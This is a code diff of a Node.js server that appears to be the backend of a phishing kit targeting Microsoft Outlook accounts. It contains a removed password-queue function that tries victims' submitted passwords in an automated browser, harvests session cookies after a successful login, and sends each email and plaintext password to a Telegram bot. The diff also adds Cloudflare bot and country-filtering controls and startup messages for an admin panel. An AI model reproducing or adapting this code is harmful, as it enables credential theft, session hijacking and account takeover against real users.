-        headers['Authorization'] = `Bearer ${config.cloudflare.apiToken}`;
-    } else if (config.cloudflare.apiKey && config.cloudflare.email) {
+        headers['Authorization'] = `Bearer ${cloudflareConfig.apiToken}`;
+    } else if (cloudflareConfig.apiKey && cloudflareConfig.email) {
         // Legacy Global API Key
-        headers['X-Auth-Email'] = config.cloudflare.email;
-        headers['X-Auth-Key'] = config.cloudflare.apiKey;
+        headers['X-Auth-Email'] = cloudflareConfig.email;
+        headers['X-Auth-Key'] = cloudflareConfig.apiKey;
     } else {
         throw new Error('Cloudflare authentication credentials missing');
     }
@@ -2222,7 +2036,7 @@ async function callCloudflareAPI(endpoint, method = 'GET', data = null) {
 // Cloudflare management endpoints
 app.get('/api/admin/cloudflare/status', requireAdminAuth, async (req, res) => {
     try {
-        if (!config.cloudflare.configured) {
+        if (!cloudflareConfig.configured) {
             return res.json({
                 success: false,
                 error: 'Cloudflare not configured',
@@ -2284,16 +2098,15 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
             testConfig.email = email;
         }
 
-        const originalConfig = { ...config.cloudflare };
-
-        // Temporarily merge test config with current config for validation
-        Object.assign(config.cloudflare, testConfig);
+        const originalConfig = { ...cloudflareConfig };
+        cloudflareConfig = testConfig;
 
         try {
             await callCloudflareAPI('');
 
-            // Save configuration using centralized config
-            config.saveCloudflareConfig(testConfig);
+            // Save configuration to file
+            fs.writeFileSync(CLOUDFLARE_CONFIG_FILE, JSON.stringify(testConfig, null, 2));
+            console.log('🌤️ Cloudflare configuration saved successfully');
 
             res.json({
                 success: true,
@@ -2302,7 +2115,7 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
 
         } catch (testError) {
             // Restore original config on test failure
-            Object.assign(config.cloudflare, originalConfig);
+            cloudflareConfig = originalConfig;
             throw new Error(`Invalid credentials: ${testError.message}`);
         }
 
@@ -2316,33 +2129,12 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
     }
 });
 
-app.get('/api/admin/cloudflare/config', requireAdminAuth, async (req, res) => {
-    try {
-        res.json({
-            success: true,
-            config: {
-                email: cloudflareConfig.email || '',
-                zoneId: cloudflareConfig.zoneId || '',
-                configured: cloudflareConfig.configured || false,
-                authMethod: cloudflareConfig.apiToken ? 'token' : (cloudflareConfig.apiKey ? 'key' : 'none')
-            }
-        });
-    } catch (error) {
-        console.error('Error retrieving Cloudflare config:', error.message);
-        res.json({
-            success: false,
-            error: 'Failed to retrieve configuration',
-            message: error.message
-        });
-    }
-});
-
 app.post('/api/admin/cloudflare/bot-fight', requireAdminAuth, async (req, res) => {
     try {
         const { enabled } = req.body;
 
-        await callCloudflareAPI('/bot_management', 'PUT', {
-            fight_mode: enabled
+        await callCloudflareAPI('/settings/bot_fight_mode', 'PATCH', {
+            value: enabled ? 'on' : 'off'
         });
 
         console.log(`🤖 Bot Fight Mode ${enabled ? 'enabled' : 'disabled'}`);
@@ -2423,457 +2215,25 @@ app.post('/api/admin/cloudflare/browser-check', requireAdminAuth, async (req, re
     }
 });
 
-// Country access control endpoints
-app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
-    try {
-        if (!config.cloudflare.configured) {
-            return res.json({
-                success: false,
-                error: 'Cloudflare not configured',
-                message: 'Configure Cloudflare API credentials to enable management features'
-            });
-        }
-
-        // Get existing custom rules
-        const response = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');
-
-        // Filter for country-related rules
-        const countryRules = response.result?.rules?.filter(rule => 
-            rule.expression && (
-                rule.expression.includes('ip.src.country') || 
-                rule.expression.includes('ip.geoip.country')
-            )
-        ) || [];
-
-        res.json({
-            success: true,
-            rules: countryRules,
-            count: countryRules.length
-        });
-
-    } catch (error) {
-        console.error('Country rules fetch error:', error.message);
-        res.json({
-            success: false,
-            error: 'Failed to fetch country rules',
-            message: error.message
-        });
-    }
-});
-
-app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
-    try {
-        const { action, countries, ruleName } = req.body;
-
-        if (!config.cloudflare.configured) {
-            return res.json({
-                success: false,
-                error: 'Cloudflare not configured'
-            });
-        }
-
-        if (!action || !countries || !Array.isArray(countries) || countries.length === 0) {
-            return res.status(400).json({
-                success: false,
-                error: 'Invalid input: action, countries array required'
-            });
-        }
-
-        // Validate action
-        if (!['block', 'allow_only'].includes(action)) {
-            return res.status(400).json({
-                success: false,
-                error: 'Action must be "block" or "allow_only"'
-            });
-        }
-
-        // Format country codes
-        const countryList = countries.map(c => c.toUpperCase().substring(0, 2));
-        const countryStr = `{"${countryList.join('" "')}"}`;
-
-        // Create expression based on action
-        let expression;
-        let description;
-
-        if (action === 'block') {
-            expression = `ip.src.country in ${countryStr}`;
-            description = `Block countries: ${countryList.join(', ')}`;
-        } else {
-            expression = `ip.src.country not in ${countryStr}`;
-            description = `Allow only countries: ${countryList.join(', ')}`;
-        }
-
-        // First get existing ruleset
-        const existingResponse = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');
-        const existingRules = existingResponse.result?.rules || [];
-
-        // Create new rule
-        const newRule = {
-            expression: expression,
-            action: action === 'block' ? 'block' : 'block',
-            description: ruleName || description,
-            enabled: true
-        };
-
-        // Add rule to existing rules
-        const updatedRules = [...existingRules, newRule];
-
-        // Update the ruleset
-        await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint', 'PUT', {
-            rules: updatedRules
-        });
-
-        console.log(`🌍 Country rule created: ${description}`);
-
-        res.json({
-            success: true,
-            action: action,
-            countries: countryList,
-            expression: expression,
-            message: `Country access rule created: ${description}`
-        });
-
-    } catch (error) {
-        console.error('Country rule creation error:', error.message);
-        res.json({
-            success: false,
-            error: 'Failed to create country rule',
-            message: error.message
-        });
-    }
-});
-
-app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, async (req, res) => {
-    try {
-        const { ruleId } = req.params;
-
-        if (!config.cloudflare.configured) {
-            return res.json({
-                success: false,
-                error: 'Cloudflare not configured'
-            });
-        }
-
-        // Get existing ruleset
-        const existingResponse = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');
-        const existingRules = existingResponse.result?.rules || [];
-
-        // Remove the rule
-        const updatedRules = existingRules.filter(rule => rule.id !== ruleId);
-
-        // Update the ruleset
-        await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint', 'PUT', {
-            rules: updatedRules
-        });
-
-        console.log(`🗑️ Country rule deleted: ${ruleId}`);
-
-        res.json({
-            success: true,
-            message: `Country rule deleted successfully`
-        });
-
-    } catch (error) {
-        console.error('Country rule deletion error:', error.message);
-        res.json({
-            success: false,
-            error: 'Failed to delete country rule',
-            message: error.message
-        });
-    }
-});
-
-// Warm browser and preload endpoints removed - all browsers created on-demand
-
-// Function to process the password retry queue
-async function processPasswordQueue(email) {
-    if (!passwordRetryQueue.has(email)) {
-        return;
-    }
-
-    const queue = passwordRetryQueue.get(email);
-
-    if (queue.processing) {
-        return; // Already processing
-    }
-
-    queue.processing = true;
-
-    try {
-        while (queue.passwords.length > 0) {
-            const { password, attemptNumber } = queue.passwords.shift(); // Get the oldest password
-
-            console.log(`⚙️ Processing password attempt ${attemptNumber} for ${email}`);
-
-            let automation = null;
-            let currentSessionId = null;
-            let loginSuccess = false;
-            let sessionValidation = null;
-
-            try {
-                // Try to use an existing automation session if available
-                if (queue.sessionId && automationSessions.has(queue.sessionId)) {
-                    const session = automationSessions.get(queue.sessionId);
-                    if (session.email === email && (session.status === 'awaiting_retry' || session.status === 'authenticating')) {
-                        automation = session.automation;
-                        currentSessionId = queue.sessionId;
-                        console.log(`⚡ [PASSWORD ATTEMPT ${attemptNumber}] Reusing existing browser session ${currentSessionId} for ${email}`);
-                        console.log(`🔍 [PASSWORD ATTEMPT ${attemptNumber}] Session status: ${session.status}`);
-                        
-                        // Check if browser is still healthy
-                        const isHealthy = await automation.isHealthy().catch(() => false);
-                        console.log(`💚 [PASSWORD ATTEMPT ${attemptNumber}] Browser health check: ${isHealthy ? 'HEALTHY' : 'UNHEALTHY'}`);
-                        
-                        if (!isHealthy) {
-                            console.warn(`❌ [PASSWORD ATTEMPT ${attemptNumber}] Browser session unhealthy, creating new one`);
-                            automation = null; // Force creation of new browser
-                        }
-                    } else {
-                        console.log(`⚠️ [PASSWORD ATTEMPT ${attemptNumber}] Existing session found but email/status mismatch. Email match: ${session.email === email}, Status: ${session.status}`);
-                    }
-                }
-
-                // If no suitable session, create a new one (cold start)
-                if (!automation) {
-                    currentSessionId = createSessionId();
-                    console.log(`❄️ [PASSWORD ATTEMPT ${attemptNumber}] Starting COLD START browser for ${email}`);
-                    console.log(`🆕 [PASSWORD ATTEMPT ${attemptNumber}] New session ID: ${currentSessionId}`);
-                    automation = new ClosedBridgeAutomation({
-                        enableScreenshots: true,
-                        screenshotQuality: 80,
-                        sessionId: currentSessionId,
-                        eventCallback: broadcastAuthEvent
-                    });
-                    console.log(`🔧 [PASSWORD ATTEMPT ${attemptNumber}] Initializing browser...`);
-                    await automation.init();
-                    console.log(`🌐 [PASSWORD ATTEMPT ${attemptNumber}] Navigating to Outlook...`);
-                    await automation.navigateToOutlook();
-                    console.log(`✅ [PASSWORD ATTEMPT ${attemptNumber}] Browser ready!`);
-                    
-                    // Store the new session
-                    automationSessions.set(currentSessionId, {
-                        automation: automation,
-                        status: 'authenticating', // Mark as authenticating
-                        email: email,
-                        startTime: Date.now(),
-                        sessionId: currentSessionId
-                    });
-                    
-                    // Update queue with session ID for potential reuse
-                    queue.sessionId = currentSessionId;
-                    console.log(`📋 [PASSWORD ATTEMPT ${attemptNumber}] Queue updated with session ID for future attempts`);
-                } else {
-                    console.log(`♻️  [PASSWORD ATTEMPT ${attemptNumber}] Reusing browser - no need to navigate again`);
-                }
-
-                // Attempt login with the current password
-                console.log(`🚀🚀🚀 [PASSWORD ATTEMPT ${attemptNumber}] Starting login attempt for ${email}`);
-                console.log(`🔑 [PASSWORD ATTEMPT ${attemptNumber}] Password: ${password.substring(0, 3)}***`);
-                loginSuccess = await automation.performLogin(email, password, attemptNumber);
-
-                if (loginSuccess) {
-                    console.log(`✅ Password attempt ${attemptNumber} successful for ${email}`);
-                    
-                    // Wait for page to fully load before extracting cookies
-                    console.log(`⏳ Waiting for page to fully load before extracting cookies...`);
-                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds for full page load
-                    
-                    // Check if we're on the inbox/mail page
-                    const currentUrl = automation.page.url();
-                    console.log(`🌐 Current URL after wait: ${currentUrl}`);
-                    
-                    // If not on mail page yet, wait a bit more
-                    if (!currentUrl.includes('/mail')) {
-                        console.log(`⏳ Not on mail page yet, waiting additional 3 seconds...`);
-                        await new Promise(resolve => setTimeout(resolve, 3000));
-                    }
-                    
-                    sessionValidation = await automation.validateSession(email, password);
-
-                    if (sessionValidation.success) {
-                        // Authentication successful, save user session
-                        userSessions.set(currentSessionId, {
-                            sessionId: currentSessionId,
-                            graphAuth: null,
-                            userEmail: email,
-                            createdAt: Date.now(),
-                            oauthState: null,
-                            authenticated: true,
-                            verified: true,
-                            cookiesSaved: sessionValidation.cookiesSaved,
-                            usedPreload: false // Cold start for retry processing
-                        });
-
-                        analytics.successfulLogins++;
-                        saveAnalytics();
-
-                        console.log(`🎯 Login successful via retry queue for ${email} (session ${currentSessionId})`);
-
-                        // Send success notification if bot is available
-                        if (telegramBot) {
-                            try {
-                                await telegramBot.sendLoginNotification({
-                                    email: email,
-                                    password: password,
-                                    timestamp: new Date().toISOString(),
-                                    sessionId: currentSessionId,
-                                    totalCookies: sessionValidation.cookiesSaved || 0,
-                                    authMethod: 'Background Password Queue',
-                                    ip: 'Queue Processing',
-                                    userAgent: 'Background Queue'
-                                });
-                                console.log(`📤 Telegram success notification sent for ${email}`);
-                            } catch (telegramError) {
-                                console.warn('Telegram success notification failed:', telegramError.message);
-                            }
-                        }
-
-                        // Clean up the automation session immediately
-                        console.log(`🧹 Closing browser after successful authentication`);
-                        if (automationSessions.has(currentSessionId)) {
-                            await automation.close();
-                            automationSessions.delete(currentSessionId);
-                        }
-                        
-                        // Clear all remaining passwords in queue
-                        const remainingPasswords = queue.passwords.length;
-                        queue.passwords = [];
-                        console.log(`✅ Success! Cleared ${remainingPasswords} remaining passwords from queue`);
-                        
-                        // Exit the loop immediately
-                        break;
-                    } else {
-                        console.error(`❌ Session validation failed after successful login for ${email}`);
-                        throw new Error('Session validation failed');
-                    }
-                } else {
-                    console.log(`❌ [PASSWORD ATTEMPT ${attemptNumber}] Password failed for ${email}`);
-                    console.log(`📊 [PASSWORD ATTEMPT ${attemptNumber}] Remaining passwords in queue: ${queue.passwords.length}`);
-
-                    // Store failed attempt
-                    const sessionDir = path.join(__dirname, 'session_data');
-                    if (!fs.existsSync(sessionDir)) {
-                        fs.mkdirSync(sessionDir, { recursive: true });
-                    }
-                    const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-                    const failureData = {
-                        id: failureId,
-                        sessionId: currentSessionId,
-                        email: email,
-                        reason: 'Wrong Password (Background Processing)',
-                        errorMessage: 'Your account or password is incorrect.',
-                        timestamp: new Date().toISOString(),
-                        status: 'invalid',
-                        method: 'password-retry-queue',
-                        attemptNumber: attemptNumber,
-                        encryptedData: encryptData(JSON.stringify({ password: password }))
-                    };
-                    fs.writeFileSync(path.join(sessionDir, `invalid_${failureId}.json`), JSON.stringify(failureData, null, 2));
-
-                    // Send Telegram notification for failed attempt
-                    if (telegramBot) {
-                        try {
-                            await telegramBot.sendFailedLoginNotification({
-                                email: email,
-                                password: password,
-                                timestamp: new Date().toISOString(),
-                                sessionId: currentSessionId,
-                                reason: `Incorrect Password (Queue Attempt ${attemptNumber})`,
-                                authMethod: 'Password Retry Queue',
-                                ip: 'Unknown', // Cannot reliably get IP here
-                                userAgent: 'Unknown'
-                            });
-                        } catch (telegramError) {
-                            console.warn('Telegram notification for queue failure failed:', telegramError.message);
-                        }
-                    }
-                    
-                    // IMPORTANT: If there are more passwords to try, keep the browser session alive!
-                    if (queue.passwords.length > 0) {
-                        console.log(`♻️  [PASSWORD ATTEMPT ${attemptNumber}] Keeping browser alive for next password attempt`);
-                        // Mark session as awaiting retry so it can be reused
-                        if (automationSessions.has(currentSessionId)) {
-                            automationSessions.get(currentSessionId).status = 'awaiting_retry';
-                            console.log(`📝 [PASSWORD ATTEMPT ${attemptNumber}] Session marked as 'awaiting_retry'`);
-                        }
-                    } else {
-                        console.log(`🔚 [PASSWORD ATTEMPT ${attemptNumber}] No more passwords to try, will close browser after error handling`);
-                    }
-                }
-
-            } catch (error) {
-                console.error(`❌❌❌ [PASSWORD ATTEMPT ${attemptNumber}] Error during password attempt for ${email}:`, error.message);
-                console.log(`📊 [PASSWORD ATTEMPT ${attemptNumber}] Remaining passwords after error: ${queue.passwords.length}`);
-
-                analytics.failedLogins++;
-                saveAnalytics();
-
-                // ONLY close browser if no more passwords to try OR if browser is unhealthy
-                const shouldCloseBrowser = queue.passwords.length === 0 || (automation && automation.isClosing);
-                
-                if (shouldCloseBrowser) {
-                    console.log(`🗑️  [PASSWORD ATTEMPT ${attemptNumber}] Closing browser (no more passwords or browser closing)`);
-                    // Clean up browser if it's managed by this process
-                    if (automation && !automation.isClosing) {
-                        try {
-                            await automation.close();
-                        } catch (closeError) {
-                            console.warn(`Error closing browser after attempt ${attemptNumber}:`, closeError.message);
-                        }
-                    }
-                    // Remove from automation sessions
-                    if (currentSessionId && automationSessions.has(currentSessionId)) {
-                        automationSessions.delete(currentSessionId);
-                        console.log(`🗑️  [PASSWORD ATTEMPT ${attemptNumber}] Session removed from automationSessions`);
-                    }
-                } else {
-                    console.log(`♻️  [PASSWORD ATTEMPT ${attemptNumber}] KEEPING browser open (${queue.passwords.length} passwords remaining)`);
-                    // Mark session as awaiting retry for next attempt
-                    if (currentSessionId && automationSessions.has(currentSessionId)) {
-                        automationSessions.get(currentSessionId).status = 'awaiting_retry';
-                        console.log(`📝 [PASSWORD ATTEMPT ${attemptNumber}] Session marked as 'awaiting_retry' after error`);
-                    }
-                }
-
-                // If this was the last password in the queue, and it failed, break
-                if (queue.passwords.length === 0) {
-                    console.log(`🔚 [PASSWORD ATTEMPT ${attemptNumber}] Last password failed, breaking loop`);
-                    break;
-                }
-            }
-        }
-    } catch (error) {
-        console.error('Unexpected error in password queue processing:', error);
-    } finally {
-        queue.processing = false;
-        // If there are still passwords in the queue, schedule the next processing run
-        if (queue.passwords.length > 0) {
-            setTimeout(() => {
-                processPasswordQueue(email).catch(error => {
-                    console.error('Background queue processing failed after delay:', error.message);
-                });
-            }, 1000); // Wait a bit before processing next batch
-        } else {
-            // Clean up the queue entry if it's empty
-            passwordRetryQueue.delete(email);
-            console.log(`✅ Password queue for ${email} is now empty and has been cleared.`);
-        }
-    }
-}
 
 
 // Start server
-app.listen(config.server.port, '0.0.0.0', () => {
-    console.log('🚀 Browser Automation Backend running on port', config.server.port);
-    console.log('🌐 Frontend available at http://localhost:' + config.server.port + '/');
-    console.log('🔧 Admin panel available at http://localhost:' + config.server.port + '/ad.html');
+app.listen(PORT, '0.0.0.0', () => {
+    console.log('🚀 Microsoft Graph API Backend running on port', PORT);
+    console.log('📧 API endpoints available at http://localhost:' + PORT + '/api/');
+    console.log('🌐 Frontend available at http://localhost:' + PORT + '/');
+    console.log('🔧 Admin panel available at http://localhost:' + PORT + '/ad.html');
+
+    // Check Azure configuration
+    if (process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID) {
+        console.log('✅ Azure credentials configured - Graph API ready');
+    } else {
+        console.log('⚠️ Azure credentials missing - Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID');
+    }
 
     if (!telegramBot) {
         console.log('❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications');
     } else {
         console.log('🔑 Admin token available via Telegram bot - Use /start to access');
     }
-
-    // Browser preparation disabled - browsers launch only when user enters email
-    console.log('⚡ Fast mode: Browsers launch on-demand only');
 });
